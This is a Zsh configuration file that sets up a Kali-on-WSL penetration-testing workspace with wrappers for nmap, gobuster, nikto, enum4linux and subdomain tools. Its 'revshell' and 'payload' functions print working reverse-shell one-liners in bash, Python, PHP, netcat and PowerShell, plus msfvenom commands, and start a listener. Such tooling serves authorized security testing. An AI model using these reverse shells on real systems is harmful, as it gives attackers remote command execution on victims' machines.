# =====================================
# WSL Kali Setup - Cybersecurity Configuration
# =====================================
# 
# A clean, tested Zsh configuration for cybersecurity professionals
# GitHub: https://github.com/cyb0rgdoll/wslkalisetup
#
# =====================================

# Basic Path Configuration
export PATH=$HOME/bin:/usr/local/bin:$PATH

# Oh-My-Zsh Configuration
export ZSH="$HOME/.oh-my-zsh"
ZSH_THEME="robbyrussell"

plugins=(
    git
    sudo
    zsh-autosuggestions
    zsh-syntax-highlighting
    zsh-completions
    command-not-found
    colored-man-pages
    extract
    web-search
    history
    jsontools
    urltools
    encode64
)

# Load Oh-My-Zsh if available
if [ -f "$ZSH/oh-my-zsh.sh" ]; then
    source $ZSH/oh-my-zsh.sh
else
    echo "Oh-My-Zsh not found. Install with:"
    echo "sh -c \"\$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\""
fi

# User configuration
export LANG=en_US.UTF-8

# Preferred editor
if [[ -n $SSH_CONNECTION ]]; then
  export EDITOR='vim'
else
  export EDITOR='nano'
fi

# Enhanced History Configuration
HISTSIZE=50000
HISTFILE=~/.zsh_history
SAVEHIST=50000
setopt APPEND_HISTORY
setopt SHARE_HISTORY
setopt HIST_EXPIRE_DUPS_FIRST
setopt HIST_IGNORE_DUPS
setopt HIST_IGNORE_ALL_DUPS
setopt HIST_FIND_NO_DUPS
setopt HIST_IGNORE_SPACE
setopt HIST_SAVE_NO_DUPS
setopt HIST_REDUCE_BLANKS
setopt HIST_VERIFY

# Disable history expansion (!)
set +H

# Auto-completion configuration
autoload -U compinit && compinit
zstyle ':completion:*' matcher-list 'm:{a-z}={A-Za-z}'
zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"
zstyle ':completion:*' menu select
zstyle ':completion:*' special-dirs true

# =====================================
# HELPER FUNCTIONS
# =====================================

# Get local IP address
get_local_ip() {
    ip route get 1.1.1.1 2>/dev/null | awk '{print $7}' | head -1 || echo "Unknown"
}

# =====================================
# BANNER
# =====================================

cybersec_banner() {
    echo ""
    echo "🛡️  WSL KALI CYBERSECURITY ENVIRONMENT"
    echo "📡 Local IP: $(get_local_ip)"
    echo "👤 User: $(whoami)"
    echo "🏠 Home: $HOME"
    echo ""
    echo "🚀 Quick Start:"
    echo "  discover <network>       - Find live hosts"
    echo "  quickscan <ip>           - Quick target scan"
    echo "  webtest <url>            - Web application testing"
    echo "  revshell <port>          - Generate reverse shell"
    echo "  payload <type> [port]    - Generate payloads"
    echo ""
    echo "🔧 Additional Tools:"
    echo "  portscan <ip> [ports]    - Detailed port scanning"
    echo "  enum <ip>                - Vulnerability enumeration"
    echo "  smbenum <ip>             - SMB enumeration"
    echo "  recon-domain <domain>    - Domain reconnaissance"
    echo ""
    echo "⚙️  Setup:"
    echo "  setup-cybersec           - Initialize environment"
    echo "  cybersec-help            - Show detailed help"
    echo ""
    echo "🔗 GitHub: https://github.com/cyb0rgdoll/wslkalisetup"
    echo ""
}

# =====================================
# BASIC ALIASES
# =====================================

alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias grep='grep --color=auto'

# Quick navigation
alias workspace='cd ~/cybersec 2>/dev/null || { mkdir -p ~/cybersec && cd ~/cybersec; }'
alias scans='cd ~/cybersec/scans 2>/dev/null || echo "Run setup-cybersec first"'
alias reports='cd ~/cybersec/reports 2>/dev/null || echo "Run setup-cybersec first"'

# =====================================
# CORE CYBERSECURITY FUNCTIONS
# =====================================

# Network Discovery
discover() {
    if [ -z "$1" ]; then
        echo "Usage: discover <network> (e.g., 192.168.1.0/24)"
        return 1
    fi
    
    echo "🔍 Discovering live hosts on $1..."
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local output_file="discovery_${timestamp}.txt"
    
    if command -v nmap &> /dev/null; then
        nmap -sn $1 | grep -E "Nmap scan report|MAC Address" | tee $output_file
        echo "✅ Results saved to: $output_file"
    else
        echo "❌ nmap not found. Install with: sudo apt install nmap"
    fi
}

# Quick Target Scanning
quickscan() {
    if [ -z "$1" ]; then
        echo "Usage: quickscan <ip>"
        return 1
    fi
    
    local target=$1
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local scan_dir="quickscan_${target}_${timestamp}"
    
    echo "🎯 Quick scanning $target..."
    mkdir -p "$scan_dir"
    cd "$scan_dir"
    
    if command -v nmap &> /dev/null; then
        echo "🔍 Port scanning..."
        nmap -sC -sV -oA quickscan_$target $target
        
        if nmap -p 80,443,8080,8443 $target | grep -q "open"; then
            echo "🌐 Web services detected..."
            if command -v whatweb &> /dev/null; then
                whatweb http://$target 2>/dev/null > whatweb_http.txt || true
                whatweb https://$target 2>/dev/null > whatweb_https.txt || true
            fi
        fi
        
        echo "✅ Quick scan complete - results in: $(pwd)"
        cd ..
    else
        echo "❌ nmap not found. Install with: sudo apt install nmap"
        rmdir "$scan_dir" 2>/dev/null
    fi
}

# Port Scanning
portscan() {
    if [ -z "$1" ]; then
        echo "Usage: portscan <ip> [ports]"
        echo "Example: portscan 192.168.1.1 1-1000"
        return 1
    fi
    
    local target=$1
    local ports=${2:-"1-10000"}
    
    echo "🔌 Scanning ports $ports on $target..."
    
    if command -v nmap &> /dev/null; then
        nmap -p $ports -sC -sV $target
    else
        echo "❌ nmap not found. Install with: sudo apt install nmap"
    fi
}

# Vulnerability Enumeration
enum() {
    if [ -z "$1" ]; then
        echo "Usage: enum <ip>"
        return 1
    fi
    
    local target=$1
    echo "🔍 Vulnerability enumeration on $target..."
    
    if command -v nmap &> /dev/null; then
        nmap -sC -sV --script=vuln $target
    else
        echo "❌ nmap not found. Install with: sudo apt install nmap"
    fi
}

# SMB Enumeration
smbenum() {
    if [ -z "$1" ]; then
        echo "Usage: smbenum <ip>"
        return 1
    fi
    
    local target=$1
    echo "📂 SMB enumeration on $target..."
    
    if command -v enum4linux &> /dev/null; then
        enum4linux -a $target
    elif command -v smbclient &> /dev/null; then
        echo "📂 SMB shares:"
        smbclient -L $target -N 2>/dev/null || echo "SMB connection failed"
    else
        echo "❌ SMB tools not found. Install with: sudo apt install enum4linux smbclient"
    fi
}

# Web Application Testing
webtest() {
    if [ -z "$1" ]; then
        echo "Usage: webtest <url>"
        return 1
    fi
    
    local url=$1
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local test_dir="webtest_${timestamp}"
    
    echo "🌐 Web application testing for $url"
    mkdir -p "$test_dir"
    cd "$test_dir"
    
    echo "📋 Technology detection..."
    if command -v whatweb &> /dev/null; then
        whatweb $url | tee whatweb.txt
    else
        echo "whatweb not found - install with: sudo apt install whatweb"
    fi
    
    echo "🔍 Directory enumeration..."
    if command -v gobuster &> /dev/null; then
        if [ -f /usr/share/wordlists/dirb/common.txt ]; then
            gobuster dir -u $url -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt -q &
        else
            echo "Wordlist not found"
        fi
    else
        echo "gobuster not found - install with: sudo apt install gobuster"
    fi
    
    echo "🛡️ Basic security scan..."
    if command -v nikto &> /dev/null; then
        nikto -h $url -o nikto.txt &
    else
        echo "nikto not found - install with: sudo apt install nikto"
    fi
    
    echo "✅ Web testing initiated - results will be in: $(pwd)"
    cd ..
}

# Domain Reconnaissance
recon-domain() {
    if [ -z "$1" ]; then
        echo "Usage: recon-domain <domain>"
        return 1
    fi
    
    local domain=$1
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local recon_dir="recon_${domain}_${timestamp}"
    
    echo "🔍 Domain reconnaissance for $domain..."
    mkdir -p "$recon_dir"
    cd "$recon_dir"
    
    echo "🔍 Subdomain enumeration..."
    if command -v subfinder &> /dev/null; then
        subfinder -d $domain -o subdomains.txt
        if [ -f subdomains.txt ] && command -v httpx &> /dev/null; then
            echo "🌐 Checking live hosts..."
            cat subdomains.txt | httpx -silent > live_hosts.txt
        fi
    else
        echo "subfinder not found - install Go tools with install-go-tools"
    fi
    
    echo "✅ Domain reconnaissance complete - results in: $(pwd)"
    cd ..
}

# =====================================
# PAYLOAD GENERATION
# =====================================

# Reverse Shell Generator
revshell() {
    local port=${1:-4444}
    local ip=$(get_local_ip)
    
    echo "🐚 Reverse Shell Payloads (IP: $ip, Port: $port)"
    echo "════════════════════════════════════════════════"
    echo ""
    echo "🐧 Bash:"
    echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo ""
    echo "🐍 Python3:"
    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    echo ""
    echo "🪟 PowerShell:"
    echo "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
    echo ""
    echo "🎧 Starting netcat listener on port $port..."
    
    if command -v nc &> /dev/null; then
        nc -lvnp $port
    else
        echo "❌ netcat not found. Install with: sudo apt install netcat-openbsd"
    fi
}

# Payload Generator
payload() {
    local type=${1:-help}
    local ip=$(get_local_ip)
    local port=${2:-4444}
    
    case $type in
        "help"|"")
            echo "Usage: payload <type> [port]"
            echo ""
            echo "Available types:"
            echo "  bash         - Bash reverse shell"
            echo "  python       - Python reverse shell"
            echo "  php          - PHP reverse shell"
            echo "  nc           - Netcat reverse shell"
            echo "  powershell   - PowerShell reverse shell"
            echo "  msfvenom     - MSFvenom examples"
            echo ""
            ;;
        "bash")
            echo "🐧 Bash Reverse Shell (IP: $ip, Port: $port):"
            echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
            ;;
        "python"|"py")
            echo "🐍 Python Reverse Shell (IP: $ip, Port: $port):"
            echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            ;;
        "php")
            echo "🌐 PHP Reverse Shell (IP: $ip, Port: $port):"
            echo "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ;;
        "nc"|"netcat")
            echo "🔌 Netcat Reverse Shell (IP: $ip, Port: $port):"
            echo "nc -e /bin/sh $ip $port"
            echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
            ;;
        "powershell"|"ps")
            echo "🪟 PowerShell Reverse Shell (IP: $ip, Port: $port):"
            echo "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
            ;;
        "msfvenom"|"msf")
            echo "🎯 MSFvenom Examples (IP: $ip, Port: $port):"
            echo ""
            echo "Linux ELF:"
            echo "msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f elf > shell"
            echo ""
            echo "Windows EXE:"
            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe > shell.exe"
            ;;
        *)
            echo "❌ Unknown payload type. Use 'payload help' for options."
            ;;
    esac
}

# =====================================
# FILE UTILITIES
# =====================================

# Enhanced file viewing
viewfile() {
    if [ -z "$1" ]; then
        echo "Usage: viewfile <file>"
        return 1
    fi
    
    if command -v batcat &> /dev/null; then
        batcat --paging=never --style=numbers --wrap=never "$1"
    elif command -v bat &> /dev/null; then
        bat --paging=never --style=numbers --wrap=never "$1"
    else
        cat -n "$1"
    fi
}

# Plain text for copying
copytext() {
    if [ -z "$1" ]; then
        echo "Usage: copytext <file>"
        return 1
    fi
    
    if command -v batcat &> /dev/null; then
        batcat --paging=never --style=plain --wrap=never "$1"
    elif command -v bat &> /dev/null; then
        bat --paging=never --style=plain --wrap=never "$1"
    else
        cat "$1"
    fi
}

# Copy specific lines
copylines() {
    if [ -z "$1" ] || [ -z "$2" ]; then
        echo "Usage: copylines <file> <line_number> [end_line]"
        return 1
    fi
    
    local file=$1
    local start=$2
    local end=${3:-$2}
    
    sed -n "${start},${end}p" "$file"
}

# =====================================
# UTILITY FUNCTIONS
# =====================================

# Network information
myip() {
    echo "🌐 Network Information:"
    echo "Internal IP: $(get_local_ip)"
    echo "External IP: $(curl -s ifconfig.me 2>/dev/null || echo 'Unable to fetch')"
    echo "Hostname: $(hostname)"
    echo "User: $(whoami)"
}

# Quick port check
ports() {
    if [ -z "$1" ]; then
        echo "Usage: ports <ip>"
        return 1
    fi
    
    local target=$1
    echo "🔌 Scanning common ports on $target..."
    
    if command -v nmap &> /dev/null; then
        nmap -F $target | grep '^[0-9]'
    else
        echo "❌ nmap not found. Install with: sudo apt install nmap"
    fi
}

# =====================================
# ENVIRONMENT SETUP
# =====================================

# Setup cybersecurity environment
setup-cybersec() {
    echo "🏗️ Setting up cybersecurity environment..."
    
    mkdir -p ~/cybersec/{scans,exploits,loot,notes,scripts,tools,wordlists,reports}
    mkdir -p ~/cybersec/scans/{nmap,web,vuln}
    mkdir -p ~/cybersec/reports/{daily,final}
    mkdir -p ~/cybersec/notes/{targets,methodology,findings}
    
    # Create useful scripts
    cat > ~/cybersec/scripts/listener.sh << 'EOF'
#!/bin/bash
port=${1:-4444}
echo "Starting listener on port $port..."
nc -lvnp $port
EOF
    chmod +x ~/cybersec/scripts/listener.sh
    
    # Create notes template
    cat > ~/cybersec/notes/template.md << 'EOF'
# Penetration Test Notes

## Target Information
- **Target**: 
- **Date**: 
- **Scope**: 

## Reconnaissance
- 

## Vulnerability Assessment
- 

## Exploitation
- 

## Post-Exploitation
- 

## Recommendations
- 
EOF
    
    echo "✅ Cybersecurity environment created!"
    echo "📁 Main workspace: ~/cybersec/"
    echo "🚀 Quick start: cd ~/cybersec"
}

# Install basic tools
install-pentest-tools() {
    echo "📦 Installing basic penetration testing tools..."
    
    sudo apt update
    
    local tools=(
        "nmap" "gobuster" "nikto" "whatweb" "curl" "wget" "git"
        "enum4linux" "smbclient" "netcat-openbsd" "xclip" "tree" "jq"
    )
    
    for tool in "${tools[@]}"; do
        if ! command -v ${tool%% *} &> /dev/null; then
            echo "Installing $tool..."
            sudo apt install -y "$tool" || echo "Failed to install $tool"
        else
            echo "$tool already installed"
        fi
    done
    
    echo "✅ Basic tools installation complete!"
}

# Install Go-based tools
install-go-tools() {
    echo "📦 Installing Go-based security tools..."
    
    if ! command -v go &> /dev/null; then
        echo "Installing Go..."
        wget -q https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
        sudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz
        rm go1.21.5.linux-amd64.tar.gz
        export PATH=$PATH:/usr/local/go/bin
        echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.zshrc
    fi
    
    local go_tools=(
        "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
        "github.com/projectdiscovery/httpx/cmd/httpx@latest"
        "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
        "github.com/tomnomnom/assetfinder@latest"
    )
    
    for tool in "${go_tools[@]}"; do
        echo "Installing $(basename $tool)..."
        go install "$tool" || echo "Failed to install $tool"
    done
    
    echo "✅ Go tools installation complete!"
}

# =====================================
# HELP SYSTEM
# =====================================

cybersec-help() {
    echo "🛡️ WSL KALI CYBERSECURITY ENVIRONMENT HELP"
    echo "=========================================="
    echo ""
    echo "🚀 CORE FUNCTIONS:"
    echo "  discover <network>       - Network discovery"
    echo "  quickscan <ip>           - Quick target scan"
    echo "  portscan <ip> [ports]    - Detailed port scanning"
    echo "  enum <ip>                - Vulnerability enumeration"
    echo "  smbenum <ip>             - SMB enumeration"
    echo "  recon-domain <domain>    - Domain reconnaissance"
    echo ""
    echo "🌐 WEB TESTING:"
    echo "  webtest <url>            - Web application testing"
    echo ""
    echo "🐚 PAYLOAD GENERATION:"
    echo "  payload <type> [port]    - Generate payloads"
    echo "  revshell [port]          - Reverse shell + listener"
    echo ""
    echo "📁 FILE OPERATIONS:"
    echo "  viewfile <file>          - Display with line numbers"
    echo "  copytext <file>          - Plain text for copying"
    echo "  copylines <file> <s> [e] - Extract specific lines"
    echo ""
    echo "🔧 UTILITIES:"
    echo "  myip                     - Network information"
    echo "  ports <ip>               - Quick port check"
    echo ""
    echo "⚙️ SETUP:"
    echo "  setup-cybersec           - Initialize environment"
    echo "  install-pentest-tools    - Install basic tools"
    echo "  install-go-tools         - Install Go tools"
    echo ""
    echo "🔗 GitHub: https://github.com/cyb0rgdoll/wslkalisetup"
}

# =====================================
# CONFIGURATION LOADING
# =====================================

# Load API keys if available
[ -f "$HOME/.config/cybersec/api_keys.env" ] && source "$HOME/.config/cybersec/api_keys.env"

# Add tools to PATH
export PATH=$PATH:~/cybersec/tools:~/go/bin:/usr/local/go/bin

# Show banner on startup
cybersec_banner

# Final message
echo "🛡️ WSL Kali Cybersecurity Environment Loaded!"
echo "📖 Type 'cybersec-help' for detailed usage information"
